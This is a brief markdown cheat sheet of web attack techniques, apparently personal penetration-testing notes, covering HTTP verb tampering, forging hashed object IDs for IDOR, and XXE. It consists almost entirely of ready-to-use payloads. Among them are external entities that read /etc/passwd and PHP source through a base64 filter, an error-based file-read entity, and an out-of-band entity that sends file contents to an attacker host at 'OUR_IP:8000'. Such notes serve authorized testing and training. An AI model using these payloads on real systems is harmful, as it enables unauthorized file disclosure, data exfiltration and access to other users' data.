#web #xxe #idor #verb-tampering

# Web Attacks (Verb Tampering / IDOR / XXE)

Related: [server-side-attacks](server-side-attacks.md) · [auth-attacks](auth-attacks.md) · [file-upload](file-upload.md)

## HTTP Verb Tampering
```bash
curl -X OPTIONS http://target/ -i
```
List allowed methods, then try `PUT`/`DELETE`/`HEAD` to bypass method-based access controls.

## IDOR
```bash
echo -n 1 | md5sum
```
Reproduce a hashed object reference (also `base64`) to forge access to other users' objects.

## XXE
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```
Define an external entity to read a local file.

```xml
<!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```
Read source code via the base64 filter. See [file-inclusion](file-inclusion.md).

```xml
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```
Error-based file read (leak contents via a parse error).

```xml
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```
Out-of-band file exfiltration. See [server-side-attacks](server-side-attacks.md).
